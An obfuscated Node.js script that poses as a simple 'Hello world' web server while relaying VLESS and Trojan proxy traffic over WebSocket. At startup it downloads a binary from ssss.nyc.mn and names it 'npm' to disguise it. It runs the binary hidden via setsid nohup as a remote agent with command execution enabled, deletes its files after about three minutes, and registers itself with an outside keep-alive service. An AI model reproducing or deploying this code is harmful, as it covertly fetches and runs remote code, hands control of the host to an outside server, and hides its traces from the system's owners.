function _0x149d(_0x2f7692,_0x4f71f6){_0x2f7692=_0x2f7692-0x163;const _0x2a9c4c=_0x2a9c();let _0x149d90=_0x2a9c4c[_0x2f7692];return _0x149d90;}const _0x42de94=_0x149d;(function(_0x4585fc,_0x35af0e){const _0x4e5ca7=_0x149d,_0x5d4f0f=_0x4585fc();while(!![]){try{const _0x1b0146=parseInt(_0x4e5ca7(0x1bf))/0x1*(parseInt(_0x4e5ca7(0x1ce))/0x2)+parseInt(_0x4e5ca7(0x1cf))/0x3+parseInt(_0x4e5ca7(0x17d))/0x4+parseInt(_0x4e5ca7(0x1b0))/0x5+parseInt(_0x4e5ca7(0x17f))/0x6*(parseInt(_0x4e5ca7(0x169))/0x7)+-parseInt(_0x4e5ca7(0x190))/0x8+-parseInt(_0x4e5ca7(0x1ae))/0x9;if(_0x1b0146===_0x35af0e)break;else _0x5d4f0f['push'](_0x5d4f0f['shift']());}catch(_0x83a918){_0x5d4f0f['push'](_0x5d4f0f['shift']());}}}(_0x2a9c,0xad95d));const os=require('os'),http=require(_0x42de94(0x1ca)),fs=require('fs'),axios=require(_0x42de94(0x1cc)),net=require(_0x42de94(0x178)),path=require('path'),crypto=require(_0x42de94(0x19a)),{Buffer}=require(_0x42de94(0x19d)),{exec,execSync}=require(_0x42de94(0x1b8)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x42de94(0x172)][_0x42de94(0x1da)]||_0x42de94(0x1b1),NEZHA_SERVER=process[_0x42de94(0x172)][_0x42de94(0x1e0)]||'',NEZHA_PORT=process[_0x42de94(0x172)][_0x42de94(0x1c8)]||'',NEZHA_KEY=process['env'][_0x42de94(0x177)]||'',DOMAIN=process['env'][_0x42de94(0x18e)]||_0x42de94(0x198),AUTO_ACCESS=process[_0x42de94(0x172)][_0x42de94(0x164)]||!![],WSPATH=process['env'][_0x42de94(0x191)]||UUID[_0x42de94(0x1d4)](0x0,0x8),SUB_PATH=process[_0x42de94(0x172)][_0x42de94(0x1db)]||'sub',NAME=process[_0x42de94(0x172)][_0x42de94(0x1c1)]||_0x42de94(0x173),PORT=process[_0x42de94(0x172)]['PORT']||0x1eb4;let ISP='';function _0x2a9c(){const _0xb83a5f=['write','substr','Failed\x20to\x20resolve\x20','find','DOMAIN','from','1935768gHtsQf','WSPATH','npm','update','Answer','base64','443','log','hugface.ippi.netlib.re','close','crypto','country','arch','buffer','catch','unlink','aarch64','\x20with\x20all\x20DNS\x20servers','writeFileSync','writeHead','test','Not\x20Found\x0a','Status','trojan://',':443?encryption=none&security=tls&sni=','&type=A','https://dns.google/resolve?name=','2053','includes','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','19376541daDAFb','reduce','3379395BCwtZz','c531af64-8a17-4a9b-8f2f-8d487b7a162c','get','connect','createHash','connection',':443?security=tls&sni=','asOrganization','child_process','1.1.1.1','8.8.4.4','false','2087','finish','createWriteStream','226fuPgAq','pipe','NAME','text/html','utf8','concat','https://amd64.ssss.nyc.mn/agent','npm\x20is\x20already\x20running,\x20skip\x20running...','join','NEZHA_PORT','text/plain','http','https://','axios','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','596NPThOn','3957783CoYsfG','readUInt8','index.html','https://speed.cloudflare.com/meta','8443','slice','error','Hello\x20world!','https://arm64.ssss.nyc.mn/agent','npm\x20is\x20running','end','UUID','SUB_PATH','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','split','2096','npm\x20running\x20error:','NEZHA_SERVER','toString','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','Server\x20is\x20running\x20on\x20port\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','AUTO_ACCESS','once','length','error:\x20','type','6995436JdBMny','readFile','&path=%2F','message','sha224','Server','pop','url','arm','env','Hugface','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Unknown','https://amd64.ssss.nyc.mn/v1','NEZHA_KEY','net','createServer','arm64','readUInt16BE','map','176356jtJeeZ','then','6joJDjS','vless://','npm\x20download\x20successfully','&fp=chrome&type=ws&host=','digest','post','Automatic\x20Access\x20Task\x20added\x20successfully','client_secret:\x20','replace','utf-8','data'];_0x2a9c=function(){return _0xb83a5f;};return _0x2a9c();}const GetISP=async()=>{const _0xc39f6c=_0x42de94;try{const _0x337b87=await axios[_0xc39f6c(0x1b2)](_0xc39f6c(0x1d2)),_0x486c70=_0x337b87[_0xc39f6c(0x189)];ISP=(_0x486c70[_0xc39f6c(0x19b)]+'-'+_0x486c70[_0xc39f6c(0x1b7)])['replace'](/ /g,'_');}catch(_0x2c97ef){ISP=_0xc39f6c(0x175);}};GetISP();const httpServer=http[_0x42de94(0x179)]((_0x17cb40,_0x2f989a)=>{const _0x50301e=_0x42de94;if(_0x17cb40[_0x50301e(0x170)]==='/'){const _0x3cd079=path[_0x50301e(0x1c7)](__dirname,_0x50301e(0x1d1));fs[_0x50301e(0x16a)](_0x3cd079,_0x50301e(0x1c3),(_0x23e1c2,_0x1cd846)=>{const _0x4bf4d8=_0x50301e;if(_0x23e1c2){_0x2f989a[_0x4bf4d8(0x1a3)](0xc8,{'Content-Type':_0x4bf4d8(0x1c2)}),_0x2f989a[_0x4bf4d8(0x1d9)](_0x4bf4d8(0x1d6));return;}_0x2f989a[_0x4bf4d8(0x1a3)](0xc8,{'Content-Type':_0x4bf4d8(0x1c2)}),_0x2f989a['end'](_0x1cd846);});return;}else{if(_0x17cb40[_0x50301e(0x170)]==='/'+SUB_PATH){const _0x3386d3=_0x50301e(0x180)+UUID+'@'+DOMAIN+_0x50301e(0x1a8)+DOMAIN+_0x50301e(0x182)+DOMAIN+_0x50301e(0x16b)+WSPATH+'#'+NAME+'-'+ISP,_0x1b7877=_0x50301e(0x1a7)+UUID+'@'+DOMAIN+_0x50301e(0x1b6)+DOMAIN+_0x50301e(0x182)+DOMAIN+_0x50301e(0x16b)+WSPATH+'#'+NAME+'-'+ISP,_0x35ec22=_0x3386d3+'\x0a'+_0x1b7877,_0x12dc16=Buffer[_0x50301e(0x18f)](_0x35ec22)[_0x50301e(0x1e1)](_0x50301e(0x195));_0x2f989a[_0x50301e(0x1a3)](0xc8,{'Content-Type':'text/plain'}),_0x2f989a[_0x50301e(0x1d9)](_0x12dc16+'\x0a');}else _0x2f989a['writeHead'](0x194,{'Content-Type':_0x50301e(0x1c9)}),_0x2f989a[_0x50301e(0x1d9)](_0x50301e(0x1a5));}}),wss=new WebSocket[(_0x42de94(0x16e))]({'server':httpServer}),uuid=UUID[_0x42de94(0x187)](/-/g,''),DNS_SERVERS=[_0x42de94(0x1ba),_0x42de94(0x1b9)];function resolveHost(_0x3d2cbd){return new Promise((_0x4fea13,_0x35d033)=>{const _0x1f772d=_0x149d;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1f772d(0x1a4)](_0x3d2cbd)){_0x4fea13(_0x3d2cbd);return;}let _0x19d652=0x0;function _0x2e3f05(){const _0x46c72d=_0x1f772d;if(_0x19d652>=DNS_SERVERS[_0x46c72d(0x166)]){_0x35d033(new Error(_0x46c72d(0x18c)+_0x3d2cbd+_0x46c72d(0x1a1)));return;}const _0x2b4612=DNS_SERVERS[_0x19d652];_0x19d652++;const _0xd28cae=_0x46c72d(0x1aa)+encodeURIComponent(_0x3d2cbd)+_0x46c72d(0x1a9);axios['get'](_0xd28cae,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x46c72d(0x17e)](_0x3cf20f=>{const _0x13971c=_0x46c72d,_0x73f37a=_0x3cf20f[_0x13971c(0x189)];if(_0x73f37a[_0x13971c(0x1a6)]===0x0&&_0x73f37a[_0x13971c(0x194)]&&_0x73f37a[_0x13971c(0x194)][_0x13971c(0x166)]>0x0){const _0x1eb9c0=_0x73f37a[_0x13971c(0x194)][_0x13971c(0x18d)](_0x451550=>_0x451550[_0x13971c(0x168)]===0x1);if(_0x1eb9c0){_0x4fea13(_0x1eb9c0['data']);return;}}_0x2e3f05();})[_0x46c72d(0x19e)](_0x4694bf=>{_0x2e3f05();});}_0x2e3f05();});}function handleVlessConnection(_0x286f11,_0x1b16cc){const _0x421d68=_0x42de94,[_0x2a1aeb]=_0x1b16cc,_0x80e93e=_0x1b16cc[_0x421d68(0x1d4)](0x1,0x11);if(!_0x80e93e['every']((_0x3ef44f,_0x5de2f4)=>_0x3ef44f==parseInt(uuid[_0x421d68(0x18b)](_0x5de2f4*0x2,0x2),0x10)))return![];let _0x4227b3=_0x1b16cc[_0x421d68(0x1d4)](0x11,0x12)[_0x421d68(0x1d0)]()+0x13;const _0x1e400f=_0x1b16cc[_0x421d68(0x1d4)](_0x4227b3,_0x4227b3+=0x2)[_0x421d68(0x17b)](0x0),_0xb206a4=_0x1b16cc[_0x421d68(0x1d4)](_0x4227b3,_0x4227b3+=0x1)[_0x421d68(0x1d0)](),_0x4d5d13=_0xb206a4==0x1?_0x1b16cc[_0x421d68(0x1d4)](_0x4227b3,_0x4227b3+=0x4)[_0x421d68(0x1c7)]('.'):_0xb206a4==0x2?new TextDecoder()['decode'](_0x1b16cc[_0x421d68(0x1d4)](_0x4227b3+0x1,_0x4227b3+=0x1+_0x1b16cc[_0x421d68(0x1d4)](_0x4227b3,_0x4227b3+0x1)[_0x421d68(0x1d0)]())):_0xb206a4==0x3?_0x1b16cc['slice'](_0x4227b3,_0x4227b3+=0x10)[_0x421d68(0x1af)]((_0x5e66ce,_0x3933ca,_0x298d60,_0x1fbb06)=>_0x298d60%0x2?_0x5e66ce[_0x421d68(0x1c4)](_0x1fbb06[_0x421d68(0x1d4)](_0x298d60-0x1,_0x298d60+0x1)):_0x5e66ce,[])[_0x421d68(0x17c)](_0xcb69bc=>_0xcb69bc[_0x421d68(0x17b)](0x0)[_0x421d68(0x1e1)](0x10))[_0x421d68(0x1c7)](':'):'';_0x286f11['send'](new Uint8Array([_0x2a1aeb,0x0]));const _0xf7a4e6=createWebSocketStream(_0x286f11);return resolveHost(_0x4d5d13)[_0x421d68(0x17e)](_0x2a7e85=>{const _0x3af04c=_0x421d68;net[_0x3af04c(0x1b3)]({'host':_0x2a7e85,'port':_0x1e400f},function(){const _0x3b4c49=_0x3af04c;this[_0x3b4c49(0x18a)](_0x1b16cc[_0x3b4c49(0x1d4)](_0x4227b3)),_0xf7a4e6['on'](_0x3b4c49(0x1d5),()=>{})['pipe'](this)['on'](_0x3b4c49(0x1d5),()=>{})[_0x3b4c49(0x1c0)](_0xf7a4e6);})['on'](_0x3af04c(0x1d5),()=>{});})[_0x421d68(0x19e)](_0x3d2f18=>{const _0x3931e4=_0x421d68;net[_0x3931e4(0x1b3)]({'host':_0x4d5d13,'port':_0x1e400f},function(){const _0x85415=_0x3931e4;this[_0x85415(0x18a)](_0x1b16cc[_0x85415(0x1d4)](_0x4227b3)),_0xf7a4e6['on']('error',()=>{})[_0x85415(0x1c0)](this)['on'](_0x85415(0x1d5),()=>{})[_0x85415(0x1c0)](_0xf7a4e6);})['on'](_0x3931e4(0x1d5),()=>{});}),!![];}function handleTrojanConnection(_0x506781,_0xd72391){const _0x3337f6=_0x42de94;try{if(_0xd72391[_0x3337f6(0x166)]<0x3a)return![];const _0x43acb4=_0xd72391[_0x3337f6(0x1d4)](0x0,0x38)[_0x3337f6(0x1e1)](),_0x2d7d0c=[UUID];let _0x49b9e9=null;for(const _0xfa6fb4 of _0x2d7d0c){const _0x440869=crypto[_0x3337f6(0x1b4)](_0x3337f6(0x16d))[_0x3337f6(0x193)](_0xfa6fb4)[_0x3337f6(0x183)]('hex');if(_0x440869===_0x43acb4){_0x49b9e9=_0xfa6fb4;break;}}if(!_0x49b9e9)return![];let _0x53267d=0x38;_0xd72391[_0x53267d]===0xd&&_0xd72391[_0x53267d+0x1]===0xa&&(_0x53267d+=0x2);const _0xf7a905=_0xd72391[_0x53267d];if(_0xf7a905!==0x1)return![];_0x53267d+=0x1;const _0x27f1ae=_0xd72391[_0x53267d];_0x53267d+=0x1;let _0x4c0873,_0x2910ae;if(_0x27f1ae===0x1)_0x4c0873=_0xd72391['slice'](_0x53267d,_0x53267d+0x4)[_0x3337f6(0x1c7)]('.'),_0x53267d+=0x4;else{if(_0x27f1ae===0x3){const _0x316b7a=_0xd72391[_0x53267d];_0x53267d+=0x1,_0x4c0873=_0xd72391[_0x3337f6(0x1d4)](_0x53267d,_0x53267d+_0x316b7a)[_0x3337f6(0x1e1)](),_0x53267d+=_0x316b7a;}else{if(_0x27f1ae===0x4)_0x4c0873=_0xd72391[_0x3337f6(0x1d4)](_0x53267d,_0x53267d+0x10)[_0x3337f6(0x1af)]((_0x19fbcc,_0x1981a5,_0x23b298,_0x38a818)=>_0x23b298%0x2?_0x19fbcc[_0x3337f6(0x1c4)](_0x38a818[_0x3337f6(0x1d4)](_0x23b298-0x1,_0x23b298+0x1)):_0x19fbcc,[])['map'](_0x2a4b25=>_0x2a4b25['readUInt16BE'](0x0)[_0x3337f6(0x1e1)](0x10))[_0x3337f6(0x1c7)](':'),_0x53267d+=0x10;else return![];}}_0x2910ae=_0xd72391[_0x3337f6(0x17b)](_0x53267d),_0x53267d+=0x2;_0x53267d<_0xd72391[_0x3337f6(0x166)]&&_0xd72391[_0x53267d]===0xd&&_0xd72391[_0x53267d+0x1]===0xa&&(_0x53267d+=0x2);const _0x3498e4=createWebSocketStream(_0x506781);return resolveHost(_0x4c0873)[_0x3337f6(0x17e)](_0x26c686=>{const _0x40b3db=_0x3337f6;net[_0x40b3db(0x1b3)]({'host':_0x26c686,'port':_0x2910ae},function(){const _0x2d8f50=_0x40b3db;_0x53267d<_0xd72391[_0x2d8f50(0x166)]&&this[_0x2d8f50(0x18a)](_0xd72391[_0x2d8f50(0x1d4)](_0x53267d)),_0x3498e4['on'](_0x2d8f50(0x1d5),()=>{})[_0x2d8f50(0x1c0)](this)['on'](_0x2d8f50(0x1d5),()=>{})['pipe'](_0x3498e4);})['on'](_0x40b3db(0x1d5),()=>{});})[_0x3337f6(0x19e)](_0x1e0f19=>{const _0x158cb8=_0x3337f6;net[_0x158cb8(0x1b3)]({'host':_0x4c0873,'port':_0x2910ae},function(){const _0xec6f7d=_0x158cb8;_0x53267d<_0xd72391[_0xec6f7d(0x166)]&&this[_0xec6f7d(0x18a)](_0xd72391[_0xec6f7d(0x1d4)](_0x53267d)),_0x3498e4['on'](_0xec6f7d(0x1d5),()=>{})['pipe'](this)['on'](_0xec6f7d(0x1d5),()=>{})['pipe'](_0x3498e4);})['on'](_0x158cb8(0x1d5),()=>{});}),!![];}catch(_0x1bc07a){return![];}}wss['on'](_0x42de94(0x1b5),(_0x534ff6,_0x46d21c)=>{const _0x181abb=_0x42de94,_0x3fc305=_0x46d21c[_0x181abb(0x170)]||'';_0x534ff6[_0x181abb(0x165)](_0x181abb(0x16c),_0x2dfc7d=>{const _0x326cdc=_0x181abb;if(_0x2dfc7d['length']>0x11&&_0x2dfc7d[0x0]===0x0){const _0xed14fc=_0x2dfc7d['slice'](0x1,0x11),_0x40943b=_0xed14fc['every']((_0x1420ed,_0x5639a8)=>_0x1420ed==parseInt(uuid[_0x326cdc(0x18b)](_0x5639a8*0x2,0x2),0x10));if(_0x40943b){!handleVlessConnection(_0x534ff6,_0x2dfc7d)&&_0x534ff6['close']();return;}}!handleTrojanConnection(_0x534ff6,_0x2dfc7d)&&_0x534ff6[_0x326cdc(0x199)]();})['on'](_0x181abb(0x1d5),()=>{});});const getDownloadUrl=()=>{const _0x641ac0=_0x42de94,_0x5031dc=os[_0x641ac0(0x19c)]();return _0x5031dc===_0x641ac0(0x171)||_0x5031dc===_0x641ac0(0x17a)||_0x5031dc===_0x641ac0(0x1a0)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x641ac0(0x1d7):!NEZHA_PORT?_0x641ac0(0x176):_0x641ac0(0x1c5);},downloadFile=async()=>{const _0x1316ed=_0x42de94;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x323934=getDownloadUrl(),_0x2c8f97=await axios({'method':_0x1316ed(0x1b2),'url':_0x323934,'responseType':'stream'}),_0x37dee4=fs[_0x1316ed(0x1be)](_0x1316ed(0x192));return _0x2c8f97[_0x1316ed(0x189)][_0x1316ed(0x1c0)](_0x37dee4),new Promise((_0x1cecb2,_0x5459aa)=>{const _0x31acd9=_0x1316ed;_0x37dee4['on'](_0x31acd9(0x1bd),()=>{const _0x2f08c8=_0x31acd9;console['log'](_0x2f08c8(0x181)),exec('chmod\x20+x\x20npm',_0x501a53=>{if(_0x501a53)_0x5459aa(_0x501a53);_0x1cecb2();});}),_0x37dee4['on'](_0x31acd9(0x1d5),_0x5459aa);});}catch(_0x140b37){throw _0x140b37;}},runnz=async()=>{const _0x4b3891=_0x42de94;try{const _0x527ca4=execSync(_0x4b3891(0x1e2),{'encoding':_0x4b3891(0x188)});if(_0x527ca4['trim']()!==''){console[_0x4b3891(0x197)](_0x4b3891(0x1c6));return;}}catch(_0x3b112f){}await downloadFile();let _0x286b07='',_0x49a99c=[_0x4b3891(0x196),_0x4b3891(0x1d3),_0x4b3891(0x1de),_0x4b3891(0x1bc),'2083',_0x4b3891(0x1ab)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xe457=_0x49a99c[_0x4b3891(0x1ac)](NEZHA_PORT)?'--tls':'';_0x286b07='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xe457+_0x4b3891(0x163);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x31d063=NEZHA_SERVER[_0x4b3891(0x1ac)](':')?NEZHA_SERVER[_0x4b3891(0x1dd)](':')[_0x4b3891(0x16f)]():'',_0x2b6776=_0x49a99c[_0x4b3891(0x1ac)](_0x31d063)?'true':_0x4b3891(0x1bb),_0x2ea8b1=_0x4b3891(0x186)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x4b3891(0x1cd)+_0x2b6776+_0x4b3891(0x174)+UUID;fs[_0x4b3891(0x1a2)]('config.yaml',_0x2ea8b1);}_0x286b07=_0x4b3891(0x1dc);}else{console[_0x4b3891(0x197)](_0x4b3891(0x1ad));return;}}try{exec(_0x286b07,{'shell':'/bin/bash'},_0x248c31=>{const _0x3a530e=_0x4b3891;if(_0x248c31)console['error'](_0x3a530e(0x1df),_0x248c31);else console[_0x3a530e(0x197)](_0x3a530e(0x1d8));});}catch(_0x49361d){console[_0x4b3891(0x1d5)](_0x4b3891(0x167)+_0x49361d);}};async function addAccessTask(){const _0xa6295f=_0x42de94;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x340d86=_0xa6295f(0x1cb)+DOMAIN;try{const _0x53d4fb=await axios[_0xa6295f(0x184)]('https://oooo.serv00.net/add-url',{'url':_0x340d86},{'headers':{'Content-Type':'application/json'}});console[_0xa6295f(0x197)](_0xa6295f(0x185));}catch(_0x3665c9){}}const delFiles=()=>{const _0x12adc0=_0x42de94;fs[_0x12adc0(0x19f)](_0x12adc0(0x192),()=>{}),fs[_0x12adc0(0x19f)]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x1f1116=_0x42de94;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1f1116(0x197)](_0x1f1116(0x1e3)+PORT);});
